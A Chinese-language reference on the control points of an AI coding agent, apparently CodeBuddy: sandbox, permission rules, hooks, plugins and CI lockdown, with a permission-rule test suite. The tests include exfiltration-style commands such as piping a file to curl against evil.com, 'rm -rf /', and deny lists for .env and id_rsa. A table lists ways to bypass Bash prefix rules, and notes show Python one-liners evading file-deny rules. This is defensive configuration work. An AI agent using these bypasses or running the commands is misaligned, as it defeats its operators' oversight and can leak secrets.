| Bash 沙箱 | `sandbox.enabled`、`autoAllowBashIfSandboxed`、`excludedCommands`、`allowUnsandboxedCommands`、`enableWeakerNestedSandbox`、`sandbox.network.{allowUnixSockets,allowLocalBinding,httpProxyPort,socksProxyPort}` | 命令执行与网络出口边界 | U/J |
| auto 模式分类器规则 | `autoMode.{environment,allow,soft_deny,hard_deny}`（可用 `$defaults` 继承） | 语义化放行/拒绝边界 | U/L/C；**明确不从插件与项目共享配置读取** |
| 目录信任 | `trustedDirectories`、`trustAll` | 是否信任工作区 | U |
| 工具裁剪 | `--allowedTools` / `--disallowedTools` / `--tools`（支持 Defer/NoDefer） | 直接砍掉工具集 | **C** |
| 轮次上限 | `--max-turns`、`CODEBUDDY_CODE_MAX_TURNS`(默认 500)；agent frontmatter `maxTurns` | 防失控循环 | C + **P**(子代理) |
| MCP 隔离 | `--mcp-config`、`--strict-mcp-config`（忽略插件/项目/用户 MCP） | CI 内只跑指定 MCP | **C** |
| 设置源裁剪 | `--setting-sources user,project,local`、`--settings '{...}'` | 忽略仓库配置、注入一次性配置 | **C** |

> ⚠️ **别把 `delegate` 当成"委托他人审批"**：它是**多代理协调模式**——只放行协调类工具（`Agent` / `TaskCreate` / `SendMessage` / 团队管理），**屏蔽实现类工具**，让主代理只做拆派、把执行交给子代理。`codebuddy daemon start` 默认就跑这个模式（可用 `--permission-mode` 覆盖）。真正的"委托他人审批"见 §13.3。
>
> 实现上是一张**工具白名单**，命中之外一律拒绝（`permissionMode === Delegate && !allowSet.has(tool)` → deny）。白名单共 8 个：`Agent`、`TaskStop`、`SendMessage`、`AskUserQuestion`、`StructuredOutput`、`Skill`、`WeChatReply`、`WeComReply`。
> 注意 **`Read` / `Write` / `Edit` / `Bash` / `Grep` / `Glob` 全都不在其中** —— 这个模式下主代理连读文件都做不了，只能派活。
> daemon 的默认配置字面量：`{ port: 9527, host: "127.0.0.1", permissionMode: "delegate" }`。
>
> 另外 `plan` 模式本身不定义边界，它**委托给"进入 plan 前"的那个模式**（默认 `default`），只额外允许写入会话计划文件。

> **插件开发者注意**：插件根 `settings.json` 当前**运行时只应用 `agent` 键**（把插件自带的某个 agent 激活为主线程 Agent，从而改写系统提示、工具限制与模型）；`subagentStatusLine` 仅识别保留，未知键静默忽略。因此想通过插件"改权限"是行不通的，只能通过 `PreToolUse` hook 返回 `deny`/`ask` 来实现等效拦截。
> 同样出于安全，**插件 agent 不支持 `hooks`、`mcpServers`、`permissionMode` 三个 frontmatter 字段**。

---

## 5. 能力封装类（插件的主场，全部 P ✅）

| 控制点 | 位置（插件内） | 关键字段 | 能控制什么 |
| :--- | :--- | :--- | :--- |
| **Skills** | `skills/<name>/SKILL.md`（清单字段 `skills`） | `name`、`description`、`allowed-tools`、`disable-model-invocation`、`user-invocable`、`context: fork`、`agent`、`model`、`hooks` | 模型自动调用的能力包；`context: fork` = 隔离上下文执行（才支持 frontmatter hooks / `agent` / `model`） |
| **Subagents** | `agents/*.md`（清单字段 `agents`） | `name`、`description`、`tools`、`disallowedTools`、`model`、`effort`(minimal→max)、`maxTurns`、`skills`、`memory`(user/project/local)、`background`、`isolation:"worktree"`、`initialPrompt` | 任务分流、模型/工具/轮次/隔离级别的过程约束 |
| **Slash commands** | `commands/*.md`（清单字段 `commands`） | `description`、`argument-hint`、`allowed-tools`、`model`、`disable-model-invocation`；`$ARGUMENTS`/`$1..$n`、`` !`cmd` `` 预执行、`@file` 引用 | 人工触发的确定性流程；注册为 `/plugin-name:cmd` |
| **MCP servers** | `.mcp.json` 或清单 `mcpServers`（路径/数组/内联） | `command`、`args`、`env`、`cwd` | 接外部系统；工具名 `mcp__<server>__<tool>` |
| **LSP servers** | `.lsp.json` 或清单 `lspServers` | 必需 `command`、`extensionToLanguage`；可选 `args`、`transport`、`env`、`initializationOptions`、`settings`、`workspaceFolder`、`startupTimeout`、`shutdownTimeout`、`restartOnCrash`、`maxRestarts` | 每次编辑后即时诊断（把"错误反馈"变成过程控制） |
| **可执行文件** | `bin/` | — | 插件启用后目录进 Bash `PATH`，可作裸命令调用 |
| **默认主 Agent** | 插件根 `settings.json` 的 `agent` | — | **启用插件即改写 CodeBuddy 默认行为**（最强的插件级过程控制）；但优先级为 `product.json default → plugin agent → settings.json agent → --agent`，会被用户设置与 CLI 覆盖 |
| **Output styles** | `output-styles/*.md` | — | 输出风格 |
| 工具名清单（供 matcher / permissions 使用） | — | `Read`/`Glob`/`Grep`/`LSP`/`Write`/`Edit`/`NotebookEdit`/`Bash`/`PowerShell`/`WebFetch`/`WebSearch`/`Agent`/`Skill`/`ToolSearch`/`DeferExecuteTool`/`Task*`/`Workflow`/`EnterPlanMode`/`ExitPlanMode`/`EnterWorktree`/`LeaveWorktree`/`SlashCommand` 等 | 写 hook matcher 与权限规则的基础 |

---

## 6. 任务编排类

| 控制点 | 位置 / 触发 | 关键字段 | 主体 |
| :--- | :--- | :--- | :--- |
| **Dynamic Workflow** | `.codebuddy/workflows/*.js`（项目级优先）、`~/.codebuddy/workflows/`；`Workflow` 工具、`ultracode` 关键词、`/workflows` | 脚本 API `agent()`/`parallel()`/`pipeline()`/`phase()`；`meta.name`；门禁由脚本逻辑表达 | **J/U**，可随插件目录分发 |
| Workflow stdio 协议 | — | `task_started`/`task_progress`/`task_updated`/`task_notification`；`workflow_progress[]`、`workflow_phase`、`workflow_agent`、`state`(start/done/error/cached) | 外部系统观测与接管 |
| **Agent Teams** | `TeamCreate` + `Agent(name=...)`；共享任务列表 `~/.codebuddy/tasks/{team}/` | 成员 `subagent_type`/`model`/`mode`/`max_turns`；`plan_mode_required`；任务 `status`/`blocks`/`blockedBy`；消息 `type`=message/broadcast/shutdown_request/plan_approval_response | 多 Agent 协作的审批与依赖门禁；C + P（插件可提供团队成员 agent 定义） |
| **`/goal`** | `/goal <condition>`、`/goal clear` | 底层 = session 级 prompt-based Stop hook；三态 ok / not-yet / impossible；`--resume` 保留 | **C**（会话级捷径，等效于手写 Stop hook） |
| **定时任务** | `CronCreate`/`CronList`/`CronDelete` | `schedule`(cron)、`prompt`；仅空闲触发，带 jitter，循环任务 3 天过期；`CODEBUDDY_DISABLE_CRON=1` | C（会话级，退出即失效） |
| **Channels** | `plugin.json` 的 `channels[]`：`server`（须匹配插件 `mcpServers` 的键）+ 按频道 `userConfig`；启动 `--channels plugin:name@marketplace` | MCP capability `claude/channel`；通知 `notifications/claude/channel`；`content` + `meta`，注入为带 `source` 的 XML 标签；`claude/channel/permission` 可远程中继审批 | **P ✅** |
| **Worktree 隔离** | `--worktree [name]`、`--worktree-branch`；agent frontmatter `isolation:"worktree"`；`worktree.symlinkDirectories` | 配套 `WorktreeCreate`/`WorktreeRemove` hooks | C + **P**(子代理) |
| **Checkpointing** | 自动跟踪工具编辑；`/rewind` | 只跟踪工具编辑，**不跟踪 bash 副作用** | X（产品内置） |
| 上下文压缩 | `autoCompactEnabled`；`PreCompact`(可阻断) / `PostCompact` hooks | 控制何时压缩、压缩前保关键信息 | U + **P**(hooks) |

---

## 7. 交付与启用层（插件开发者独有的控制点）

| 控制点 | 字段 | 作用 |
| :--- | :--- | :--- |
| 清单位置 | `.codebuddy-plugin/plugin.json`（兼容 `.workbuddy-plugin/`、`.claude-plugin/`）；清单可省略，走默认目录发现 | 唯一必需字段 `name`（kebab-case，作命名空间） |
| 组件路径覆写 | `commands`/`agents`/`skills`/`outputStyles`（**替换**默认目录）、`hooks`/`mcpServers`/`lspServers`（多来源语义不同） | 所有路径必须相对且以 `./` 开头；想保留默认目录要显式写进数组 |
| 默认启用 | `defaultEnabled`(默认 true) | 首装是否即生效；已有 `enabledPlugins` 优先 |
| 插件依赖 | `dependencies:[{name,version,marketplace}]`；tag 命名 `{plugin}--v{version}`；跨市场需 marketplace.json 的 `allowCrossMarketplaceDependenciesOn` | 组合式分发；`auto:true` 依赖靠 `plugin prune` 清理 |
| **用户配置** | `userConfig.{KEY}.{description,sensitive}` | 启用时提示用户填值；可用 `${user_config.KEY}` 替换进 MCP/LSP/hook 命令，并导出 `CODEBUDDY_PLUGIN_OPTION_<KEY>` / `CLAUDE_PLUGIN_OPTION_<KEY>` / `PLUGIN_OPT_<KEY>`。敏感值进系统密钥链（约 2KB 上限） |
| 路径变量 | `${CODEBUDDY_PLUGIN_ROOT}`（更新会变）、`${CODEBUDDY_PLUGIN_DATA}`（`~/.codebuddy/plugins/data/{id}/`，跨更新保留）、`${CODEBUDDY_PROJECT_DIR}`；各有 `CLAUDE_*` 别名 | 依赖安装（配合 `SessionStart` hook 比对 `package.json` 做幂等 `npm install`）、状态持久化 |
| 安装作用域 | `user` / `project` / `local` / `managed`，写入对应 settings 的 `enabledPlugins` | `--scope project` 即"团队统一下发插件" |
| 分发清单 | `marketplace.json`：`name`、`owner`、`plugins[].{name,source,version,strict,commands,agents,skills,hooks,mcpServers}` | 市场侧声明，与 `plugin.json` 合并（冲突会报错） |
| 本地调试 | `codebuddy --plugin-dir ./p1 --plugin-dir ./p2`、`/reload-plugins`、`codebuddy plugin validate`、`codebuddy --debug`、`/plugin` 的 Errors 标签 | 同名时本地副本优先（托管强制启用的除外） |
| 缓存键 | `plugin.json` version > marketplace version > commit SHA > `unknown` | **不改 version 用户看不到变更** |
| 版本化缓存路径 | `~/.codebuddy/plugins/cache/<marketplace>/<plugin>/<version>`；源码在 `~/.codebuddy/plugins/marketplaces/<marketplace>` | 安装后**无法引用插件目录外文件**（`../shared` 失效），共享文件要用市场内符号链接 |
| 未生效字段 | `experimental.themes`、`experimental.monitors` | 当前仅识别，不加载/不启动 |

---

## 8. 环境变量类过程控制（CI / 容器里最常用，主体 = C）

| 分类 | 变量 |
| :--- | :--- |
| 开关 | `CODEBUDDY_DISABLE_AUTO_MEMORY`、`CODEBUDDY_TYPED_MEMORY_ENABLED`、`CODEBUDDY_DISABLE_CRON`、`CODEBUDDY_CODE_DISABLE_BACKGROUND_TASKS`、`CODEBUDDY_DISABLE_FORK_SUBAGENT`、`CODEBUDDY_DISABLE_BUILTIN_SUBAGENTS`、`CODEBUDDY_DISABLE_HOT_RELOAD`、`CODEBUDDY_SKIP_BUILTIN_MARKETPLACE`、`CODEBUDDY_DISABLE_EXTENDED_PLUGIN_HOOKS` |
| Bash 边界 | `BASH_DEFAULT_TIMEOUT_MS`(120000)、`BASH_MAX_TIMEOUT_MS`(600000)、`BASH_MAX_OUTPUT_LENGTH`(30000)、`CODEBUDDY_BASH_AUTO_BACKGROUND_DISABLED` |
| 轮次/模型 | `CODEBUDDY_CODE_MAX_TURNS`(500)、`CODEBUDDY_MODEL`、`CODEBUDDY_SMALL_FAST_MODEL`、`CODEBUDDY_BIG_SLOW_MODEL`、`CODEBUDDY_CODE_SUBAGENT_MODEL`、`MAX_THINKING_TOKENS` |
| MCP | `MCP_TIMEOUT`、`MCP_TOOL_TIMEOUT`、`MAX_MCP_OUTPUT_TOKENS`(20000) |
| 沙箱/Shell | `CODEBUDDY_IS_SANDBOX`、`CODEBUDDY_CODE_SHELL`、`CODEBUDDY_CODE_GIT_BASH_PATH`、`CODEBUDDY_SKIP_GIT_BASH_CHECK` |
| **审计/可观测** | `CODEBUDDY_CODE_SHELL_PREFIX`（**包装所有 shell 命令的命令前缀，文档明示可用于日志或审计**）、`CODEBUDDY_CODE_ENABLE_TELEMETRY=1`、`OTEL_EXPORTER_OTLP_ENDPOINT`、`OTEL_EXPORTER_OTLP_HEADERS`、`OTEL_TRACES_EXPORTER`、`OTEL_SERVICE_NAME`、`OTEL_RESOURCE_ATTRIBUTES`、`OTEL_LOG_USER_PROMPTS`、`OTEL_LOG_TOOL_DETAILS`、`OTEL_LOG_TOOL_CONTENT` |
| 权限 | `CODEBUDDY_SUBAGENT_PERMISSION_MODE` |
| 审批渠道 | `CODEBUDDY_WECOM_BOT_ID`、`CODEBUDDY_WECOM_BOT_SECRET`、`CODEBUDDY_WECOM_BOT_WS_URL`（私有化） |
| 调试 | `CODEBUDDY_DEBUG=1`（可见 `[ScopedHookRegistry] registered ...`） |

> OTel span 结构：根 span `codebuddy_code.interaction`（用户 prompt）、子 span `codebuddy_code.tool`（工具调用，属性含 `tool_name`、`tool.call_id`、`tool_input`，需 `OTEL_LOG_TOOL_DETAILS=1`）。⚠️ **权限决策是否作为 span 属性上报，文档未提及**（见 §13.4）。

> 设置里的 `env` 键也可为会话统一注入环境变量（J/L/U 可配）。

---

## 9. SDK / Headless 侧编程控制（主体 = 开发者代码，C）

| 控制点 | 签名 / 字段 |
| :--- | :--- |
| 工具审批回调 | `canUseTool(toolName, input, opts)` → `{behavior:'allow'|'deny', updatedInput?, interrupt?}`；`opts`: `tool_use_id`、`signal`、`agent_id`、`suggestions`、`blocked_path`、`decision_reason` |
| 编程式 hooks | 支持 `PreToolUse`/`PostToolUse`(带 matcher)、`UserPromptSubmit`、`Stop`/`SubagentStop`、`PreCompact`/`PostCompact`、`WorktreeCreate`/`WorktreeRemove`、`unstable_Checkpoint`；返回 `{continue, reason, suppressOutput, hookSpecificOutput:{...}}` |
| 运行时约束 | `permissionMode`、`tools` 白名单、`allowedTools`/`disallowedTools`、`maxTurns` |
| 会话控制 | sessions / resume API |

---

## 10. IDE 侧控制点（补充，含 CLI 插件覆盖不到的部分）

**IDE 可配置（开发者可参与）**：

| 控制点 | 精确路径 / 字段 | 说明 |
| :--- | :--- | :--- |
| 项目规则 | `.codebuddy/rules/<规则名>/RULE.mdc`（**每条规则一个文件夹**，与 CLI 的 `rules/*.md` 不同） | 设置页 → 规则 → 创建规则 |
| 规则 frontmatter | `description`、`alwaysApply`、`enabled`、`updatedAt`、`provider` | 应用类型：总是 / 智能体请求 / 手动（`@my-rule`） |
| 项目说明 | `CODEBUDDY.md`（缺失回退 `AGENTS.md`），`/init` 生成 | 与 CLI 同构 |
| Skills | `.codebuddy/skills/<name>/SKILL.md` + `scripts/`、`references/`、`assets/`；frontmatter `name`、`description`（必需）、`allowed-tools`、`disable` | 与 CLI 基本同构 |
| Subagents | 项目级 `.codebuddy/agents/`、用户级 `~/.codebuddy/agents/`；frontmatter `name`、`description`、`model`、`tools`、`agentMode`(`agentic`/`manual`)、`enabled`、`enabledAutoRun` | `agentMode`/`enabledAutoRun` 是 IDE 侧特有字段 |
| 自定义模型 | `~/.codebuddy/models.json`、`<workspace>/.codebuddy/models.json`；`models[].{id,name,vendor,apiKey,url,maxInputTokens,maxOutputTokens,supportsToolCall,supportsImages,supportsReasoning}`、`availableModels[]` | 1 秒防抖热重载 |
| MCP | 设置 → MCP → Add MCP；`mcpServers.<name>.{type,command,args,env,description}` | 也有 MCP Market 一键装 |
| 自定义斜杠指令 | IDE 只能建**项目级**；用户级需借 CLI 的 `~/.codebuddy/commands/` | 文档明示 IDE 用户级入口"后续版本增加" |

**IDE 独有、CLI 插件无法表达（X）**：

1. `@RuleName` **手动引用规则**——纯 UI 交互动作。
2. 规则「智能体请求」类型的**两段式加载**（先只加载 name+description，模型判断后再读原文）——IDE 侧上下文调度机制；CLI 的条件规则只能靠 `paths` glob 自动匹配，不支持模型智能选规则。
3. 图形化 **MCP Market 一键安装 + Try to Run** 状态校验。
4. Skills **可视化管理 / 「导入 Skill」**（从网络导入）。
5. Subagents **图形化创建表单**（Tools Built-In / Tools MCP 勾选、User/Project Tab 决定落盘级别）。
6. `models.json` 的 `availableModels` **裁剪模型下拉 UI**。
7. 记忆的**对话式增删改 + 全局开关按钮**（无配置文件）。
8. 内置指令 `/init`、`/summarize`、`/rules`、`/explain`、`/fix`、`/tests`、`/cr`（代码审查以 `/cr` 形式存在，无独立"审查规则"文件）。
9. 设计稿转代码流程节点（内置 Figma、`@workspace`、`#Codebase`）。

**未能证实（勿当依据）**：IDE 侧是否有图形化 Hooks 配置（`Features/Hooks` 页抓取为空）；企业版是否支持团队级规则集中下发（企业版页面未抓）。IDE 插件版（VS Code / JetBrains）文档未抓到，其控制点缺失。

---

## 11. 插件开发者的控制点选型决策表

| 你想控制… | 首选手段 | 备选 |
| :--- | :--- | :--- |
| 禁止某类危险操作 | `PreToolUse` hook 返回 `permissionDecision:"deny"` | 让用户在 `.codebuddy/settings.json` 配 `permissions.deny`（插件不能代配） |
| 要求二次确认 | `PreToolUse` 返回 `"ask"` + `permissionDecisionReason` | — |
| 悄悄修正模型的参数 | `PreToolUse` 的 `modifiedInput` | — |
| 编辑后自动格式化 / 跑 lint | `PostToolUse` matcher `Write|Edit` + `additionalContext` 回灌结果 | LSP 插件提供即时诊断 |
| 压缩超长工具输出省 token | `PostToolUse` 的 `updatedToolOutput` | — |
| 强制"没做完不许停" | `Stop` prompt hook + `continueOnBlock:true` | 用户侧 `/goal` |
| 每次会话注入环境/规范 | `SessionStart` hook 的 `additionalContext` | output-styles、skills |
| 改写 CodeBuddy 的默认人格与工具集 | 插件根 `settings.json` 的 `agent` 指向自带 agent | output-styles |
| 团队统一规范 | 仓库内 `.codebuddy/rules/*.md`（J），插件 skills 兜底 | `--append-system-prompt`（CI） |
| CI 里完全锁死 | `--permission-mode dontAsk` + `--allowedTools` + `--strict-mcp-config` + `--setting-sources user`（全是 C，不是插件） | — |
| 接外部系统事件驱动 | `channels[]` + MCP server | `http` 类型 hook |
| 跨会话攒状态 | `${CODEBUDDY_PLUGIN_DATA}` | Auto Memory（用户侧开关） |

### 常见坑

- 插件 agent **不支持** `hooks`/`mcpServers`/`permissionMode`；要 hooks 就放 `hooks/hooks.json`。
- 依赖 frontmatter hooks 的 Skill/Agent 默认被闸门拦掉，**必须在 README 告知用户开 `allowUntrustedFrontmatterHooks`**。
- 事件名大小写敏感（`PostToolUse` ≠ `postToolUse`）；脚本要 `chmod +x`；路径必须 `./` 开头且不能越出插件根目录。
- **同事件 hooks 并行且无序**，多方决策如何归并官方未承诺（详见 §3.7）；别假设自己是唯一 hook。

---

## 12. 权限规则：测试用例与实战场景

### 12.1 匹配语义速查

| 工具 | 语法 | 语义 |
| :--- | :--- | :--- |
| Bash | `Bash(npm run build)` | 精确匹配，命令必须完全相等 |
| Bash | `Bash(git:*)` | 末尾 `:*` → 匹配第一个词 / 多词前缀 |
| Bash | `Bash(npm run *)` | 含 `*` 时按 bash glob 匹配，**`*` 可跨 `/`** |
| Read/Edit/Write | `//path` / `~/path` / `/path` / `path`\|`./path` | 文件系统绝对 / 用户目录 / **项目根** / cwd |
| Read/Edit/Write | 匹配开关 | 允许点开头、**不区分大小写**、**裸文件名可匹配任意深度** |
| WebFetch | `WebFetch(domain:example.com)` | 主机名匹配，**含子域** |
| MCP | `mcp__server` ≡ `mcp__server__*` | 整个 server 的工具 |
| MCP | `mcp__*` | 全部 MCP 工具，**仅 `deny`/`ask` 生效** |
| Agent | `Agent(Explore)` | 按 `subagent_type` |
| Skill | `Skill(name)` | **必须精确，不支持通配符** |

> ⚠️ **两份官方文档口径不一致**：`permissions.md` 明确 Bash 支持"含 `*` 时按 bash glob 模式匹配"，而 `iam.md` 的 Warning 写的是"使用**前缀匹配**，而非正则表达式或 glob 模式，通配符 `:*` 仅在模式末尾有效"。
> 保守做法：**只依赖 `精确` 与 `:*` 两种写法**（两份文档都承认），中间带 `*` 的写法（如 `Bash(npm run *)`）上线前用 12.5 的方法在目标版本实测。

---

### 12.2 测试用例集

标记：✅ 放行　❌ 拒绝　❓ 弹审批(ask)

#### A. Bash 前缀与通配

| # | 规则 | 输入命令 | 期望 |
| :-- | :--- | :--- | :--- |
| A1 | `allow: ["Bash(npm run build)"]` | `npm run build` | ✅ |
| A2 | 同上 | `npm run build --watch` | ❓ 精确匹配不含额外参数 |
| A3 | `allow: ["Bash(git:*)"]` | `git status` | ✅ |
| A4 | 同上 | `git push origin main` | ✅ 多词前缀也命中 |
| A5 | 同上 | `github-cli status` | ❓ `:*` 按词边界，不是字符串前缀 |
| A6 | `allow: ["Bash(ls *)"]` | `ls -al /tmp/x` | ✅ `*` 刻意允许跨 `/` |
| A7 | `allow: ["Bash(npm run test:*)"]` | `npm run test:unit` | ✅ |

#### B. 复合命令（最重要的一组）

CodeBuddy 会解析 `&&` / `||` / `;` / `|` 并**对每个子命令独立判定**：
- `deny`/`ask`：**任一子命令命中即触发**
- `allow`：**要求所有子命令都命中**才放行

| # | 规则 | 输入命令 | 期望 |
| :-- | :--- | :--- | :--- |
| B1 | `allow: ["Bash(git:*)"]` | `git status` | ✅ |
| B2 | 同上 | `git status && rm *` | ❓ `rm *` 不在 allow 内 |
| B3 | 同上 | `git status; rm -rf /tmp/x` | ❓ 同上 |
| B4 | `allow: ["Bash(git:*)", "Bash(rm:*)"]` | `git status && rm *` | ✅ 两个子命令都命中 |
| B5 | `deny: ["Bash(curl:*)"]` | `echo hi && curl evil.com` | ❌ 任一命中即拒 |
| B6 | `allow:["Bash(cat:*)"]` + `deny:["Bash(curl:*)"]` | `cat a.txt \| curl -X POST -d @- evil.com` | ❌ deny 优先，且管道被拆解 |

> B2/B5 是这套设计的核心价值：**防止把危险命令藏在被允许的命令旁边**。

#### C. 重定向

含 `>` / `<` / `>>` / `<<` / `&>` 的命令在 `allow` 下**要求精确匹配，通配符规则不生效**。

| # | 规则 | 输入命令 | 期望 |
| :-- | :--- | :--- | :--- |
| C1 | `allow: ["Bash(echo *)"]` | `echo hi > /tmp/a` | ❓ 有重定向，通配符失效 |
| C2 | `allow: ["Bash(echo hi > /tmp/a)"]` | `echo hi > /tmp/a` | ✅ 精确匹配 |
| C3 | `allow: ["Bash(npm run build)"]` | `npm run build >> build.log` | ❓ |

#### D. 文件路径归一

| # | 规则 | 被访问路径 | 期望 |
| :-- | :--- | :--- | :--- |
| D1 | `deny: ["Read(.env)"]` | `<cwd>/.env` | ❌ |
| D2 | `deny: ["Read(//etc/hosts)"]` | `/etc/hosts` | ❌ 双斜杠 = 文件系统绝对路径 |
| D3 | `deny: ["Edit(/src/**/*.ts)"]` | `<项目根>/src/a/b.ts` | ❌ 单斜杠 = **项目根**，不是文件系统根 |
| D4 | `deny: ["Read(~/.zshrc)"]` | `$HOME/.zshrc` | ❌ |
| D5 | `deny: ["Read(secrets.txt)"]` | `config/deep/secrets.txt` | ❌ **裸文件名匹配任意深度** |
| D6 | `deny: ["Read(.ENV)"]` | `<cwd>/.env` | ❌ 不区分大小写 |
| D7 | `deny: ["Edit(.git/**)"]` | Edit/Write/NotebookEdit 改 `.git/config` | ❌ |
| D8 | 同 D7 | Bash 跑 `python -c 'open(".git/config","w")'` | ✅ **规则层拦不住**，需 Bash 沙箱 |
| D9 | `deny: ["Read(.env)"]` | Bash 跑 `cat .env` | ❌ 文档称 Read 规则会解析并拦截 `cat`/`head`/`tail` 等部分 Bash 读命令 |
| D10 | 同 D9 | Bash 跑 `python -c "print(open('.env').read())"` | ✅ 解析不到，同样需沙箱 |

> **D7–D10 是最容易产生虚假安全感的地方**：文件类 deny 规则只覆盖文件工具 + 少数可解析的 Bash 读命令。要真正的 OS 级边界，必须叠 `sandbox`。

#### E. WebFetch

| # | 规则 | 输入 | 期望 |
| :-- | :--- | :--- | :--- |
| E1 | `allow: ["WebFetch(domain:example.com)"]` | `https://example.com/a` | ✅ |
| E2 | 同上 | `https://api.example.com/a` | ✅ 含子域 |
| E3 | 同上 | `https://example.com.evil.com/` | ❓ 应按主机名匹配而非字符串前缀，**建议实测确认** |

#### F. MCP（坑最多）

| # | 规则 | 工具 | 期望 |
| :-- | :--- | :--- | :--- |
| F1 | `deny: ["mcp__puppeteer"]` | `mcp__puppeteer__navigate` | ❌ 整个 server |
| F2 | `deny: ["mcp__puppeteer__*"]` | 同上 | ❌ 与 F1 等价 |
| F3 | `deny: ["mcp__puppeteer__navigate"]` | `mcp__puppeteer__screenshot` | ✅ 只拦单个工具 |
| F4 | `deny: ["mcp__web-search__q"]` | `mcp__web_search__q` | ❌ 连字符/点按下划线处理，两者等价 |
| F5 | `deny: ["mcp__pup*"]` | `mcp__puppeteer__navigate` | ✅ **匹配不到且不报错**——`*` 只能整段替换最后一节 |
| F6 | `deny: ["mcp__puppeteer__nav*"]` | `mcp__puppeteer__navigate` | ✅ 同 F5，静默失效 |
| F7 | `deny: ["*"]` | 任意 MCP 工具 | ✅ **裸 `*` 对 MCP 无效**，要写 `mcp__*` |
| F8 | `allow: ["mcp__*"]` | 任意 MCP 工具 | ❓ `mcp__*` **仅 deny/ask 生效**，allow 写了不管用 |

> F5/F6/F7/F8 都是**静默失效**——不报错、不告警，规则写了等于没写。上线前必须用 `/permissions` 核对。

#### G. Agent / Skill

| # | 规则 | 输入 | 期望 |
| :-- | :--- | :--- | :--- |
| G1 | `deny: ["Agent(Explore)"]` | 主代理调 `Agent(subagent_type="Explore")` | ❌ |
| G2 | `deny: ["Skill(dangerous-skill)"]` | `/dangerous-skill` | ❌ |
| G3 | `deny: ["Skill(dangerous-*)"]` | `/dangerous-skill` | ✅ **Skill 不支持通配符**，规则失效 |

#### H. 优先级与模式交叉（回归必测）

| # | 配置 | 场景 | 期望 |
| :-- | :--- | :--- | :--- |
| H1 | user 有 `allow:["Bash(rm:*)"]`，project 有 `deny:["Bash(rm:*)"]` | `rm x` | ❌ **deny 跨作用域合并，任一即拒** |
| H2 | project `.codebuddy/settings.json` 有 `allow:["Bash(curl:*)"]`，目录**未信任** | `curl` 高危用法 | ❓ 归入"不可信 allow"(阶段❻)，**不能越过命令安全检查** |
| H3 | 同 H2，用户已确认信任该目录 | 同上 | ✅ 提升到可信层(阶段❷) |
| H4 | `defaultMode:"bypassPermissions"` | `rm -rf /` | ❓ 灾难性命令强制询问 |
| H5 | 同上 | 改 `.git/config` | ✅ 受保护路径在 bypass 下"绝大部分通过" |
| H6 | `--permission-mode dontAsk` + `allow:["Bash(npm test)"]` | `npm test` | ✅ |
| H7 | 同上 | `npm run lint` | ❌ **dontAsk 把 ask 改写为 deny** |
| H8 | `--permission-mode auto` + `ask:["Bash(git push:*)"]` | `git push` | ❓ **显式 ask 不进分类器** |
| H9 | `--permission-mode auto`，无显式规则 | 边界动作 | 由分类器判定；被拒时触发 `PermissionDenied` hook，可回 `{retry:true}` |
| H10 | `PreToolUse` hook 返回 `{permissionDecision:"deny"}` + `allow:["Bash"]` | 任意 Bash | ❌ **hook 在阶段⓿，先于所有规则** |
| H11 | `PreToolUse` hook 返回 `allow` + `deny:["Bash(rm:*)"]` | `rm x` | ✅ hook allow **绕过整个权限系统**——这就是为什么插件不该用 hook allow |
| H12 | `permissions.deny` 里写了规则，但 `disableAllHooks:true` | — | deny 仍生效（规则与 hook 是两套） |
| H13 | 非交互模式（`-p` / CI），动作最终为 ask | — | ❌ 阶段❽把未决 ask 转 deny |
| H14 | `--add-dir ../other`，该目录有 `.codebuddy/settings.json` | — | 文件可访问，但**其 `.codebuddy/` 配置不会被加载** |

---

### 12.3 已知绕过方式与加固手段

`iam.md` 明确列出 Bash 前缀匹配的绕过方式（以 `allow: ["Bash(curl http://github.com/:*)"]` 为例）：

| 绕过方式 | 示例 | 为什么绕过 |
| :--- | :--- | :--- |
| URL 前加选项 | `curl -X GET http://github.com/...` | 前缀不再匹配 |
| 换协议 | `curl https://github.com/...` | 同上 |
| 短链重定向 | `curl -L http://bit.ly/xyz` | 命令文本合规，实际跳转到别处 |
| 变量替换 | `URL=http://github.com && curl $URL` | 静态文本里没有目标域名 |
| 多余空格 | `curl  http://github.com` | 文本不等 |

**加固组合（官方建议 + 本文推论）：**

1. **换工具**：URL 过滤用 `WebFetch(domain:github.com)`，不要用 `Bash(curl ...)`。
2. **收紧方向**：白名单只写"必须放行"的，剩下交给 ask；不要试图用 `deny` 穷举危险写法——穷举一定会漏。
3. **上 hook 做语义校验**：`PreToolUse` + `type:"prompt"` 让小模型判断"这条命令实际会访问哪些域名/路径"，弥补文本匹配的盲区。
4. **上沙箱做 OS 级兜底**：`sandbox.enabled` + `sandbox.network.*`；文档明确 prompt injection 让模型想绕也绕不过 OS 边界。**WebFetch 的 `domain:` allow 与沙箱 `allowedDomains` 最终取交集**。
5. **CODEBUDDY.md 里说明允许的模式**：给模型正向引导，减少它主动尝试变形写法。

---

### 12.4 实战场景配置

**场景 1：CI 只读代码审查（最严格）**

```bash
codebuddy -p "审查本次 diff" \
  --permission-mode dontAsk \
  --allowedTools "Read Grep Glob Bash(git diff:*) Bash(git log:*)" \
  --strict-mcp-config \
  --setting-sources user \
  --max-turns 30
```

要点：`dontAsk` 让结果二元化（未命中 allow 一律 deny）；`--strict-mcp-config` 忽略仓库/插件 MCP；`--setting-sources user` 不读仓库配置，避免恶意仓库自我提权。

**场景 2：允许跑测试，但禁止发布**

```json
{
  "permissions": {
    "allow": ["Bash(npm test:*)", "Bash(npm run lint:*)", "Read", "Edit(/src/**)"],
    "ask":   ["Bash(git push:*)", "Bash(git tag:*)"],
    "deny":  ["Bash(npm publish:*)", "Bash(docker push:*)", "WebFetch"]
  }
}
```

**场景 3：保护密钥与基础设施（放 `.codebuddy/settings.json`，团队共享）**

```json
{
  "permissions": {
    "deny": [
      "Read(.env)", "Read(.env.*)", "Read(./secrets/**)", "Read(id_rsa)",
      "Edit(.github/workflows/**)", "Edit(.codebuddy/settings.json)",
      "Bash(aws:*)", "Bash(kubectl:*)", "mcp__*"
    ]
  },
  "sandbox": { "enabled": true }
}
```

要点：`Read(id_rsa)` 利用"裸文件名匹配任意深度"覆盖全仓库；`mcp__*` 才能真正禁掉 MCP（裸 `*` 无效）；必须配 `sandbox` 否则 Bash 间接读写能绕过（见 D8/D10）。

**场景 4：容器/沙箱内全自动（高危，仅隔离环境）**

```bash
export CODEBUDDY_IS_SANDBOX=1
codebuddy -y      # 等价 --permission-mode bypassPermissions
```

